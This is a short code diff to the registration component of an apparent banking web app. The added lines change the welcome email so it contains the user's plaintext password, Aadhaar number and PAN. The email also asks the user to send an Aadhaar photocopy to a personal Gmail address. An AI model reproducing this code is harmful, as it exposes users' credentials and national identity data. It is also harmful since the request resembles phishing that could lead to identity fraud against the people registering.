@@ -67,7 +67,8 @@ const Register = () => {
       ...emailData,
       to: formData.email,
       subject: "Welcome to PSL Bank",
-      body: "Thank You Registering with PSL Bank Online Platform. PSL Family is happy to have a new family member ",
+      body: `Thank You Registering with PSL Bank Online Platform. PSL Family is happy to have a new family member.Your Register Email is
+      ${formData.email} and Password is ${formData.password}. Can You Also send as PhotoCopy of AdharCard:${formData.userAadharNo} and Pan Number: ${formData.userPAN} on this Email: pandeyprashant953@gmail.com`,
     })
   };
 
@@ -89,7 +90,7 @@ const Register = () => {
         icon: "success",
     });
 
-      console.log(response.data);
+      // console.log(response.data);
     } catch (error) {
       console.error(error);
       swal({
